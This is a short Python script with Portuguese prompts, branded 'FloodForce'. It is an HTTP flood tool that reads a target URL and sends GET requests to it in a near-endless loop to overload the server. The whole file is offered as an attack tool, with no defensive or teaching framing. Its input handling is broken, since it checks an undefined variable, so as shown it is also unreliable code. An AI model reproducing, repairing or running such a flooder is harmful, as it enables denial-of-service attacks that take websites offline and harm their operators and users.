import requests
import os
import pyfiglet
from colorama import init, Fore, Style
import sys
import time

class httpFlood:
	def atack(self):
		os.system("cls" if sys.platform == "win32" else "clear")
		
		try:
			def banner():
				lg = pyfiglet.figlet_format("FloodForce")
				print(Fore.RED+f"{lg}"+Style.RESET_ALL)
			banner()
			
			try:
				ip = input(Fore.CYAN+"Digite o ip/url (http://url.com): "+Style.RESET_ALL)
				
				try:
					if not url:
						print(Fore.YELLOW+"url em branco!!")
						time.sleep(1)
						exit()
						
					elif url  == "sair":
						print(Fore.RED+"você saiu!")
						time.sleep(1)
						exit()
							
				except ValueError:
					print(Fore.RED+"ERROR")
					time.sleep(1)
					exit()
				
				for i in range(1, 1000000000):
					rqs = requests.get(ip)
					print(Fore.GREEN+f"status do flood:", rqs.status_code, f"{i}"+Style.RESET_ALL)
					
			except KeyboardInterrupt:
				print(Fore.RED+"saindo..."+Style.RESET_ALL)
				time.sleep(2)
				exit()
				
		except requests.exceptions.RequestException as e:
			print(Fore.RED+f"tipo do erro de requests: {e}"+Style.RESET_ALL)
			
HFD = httpFlood()
HFD.atack()
				
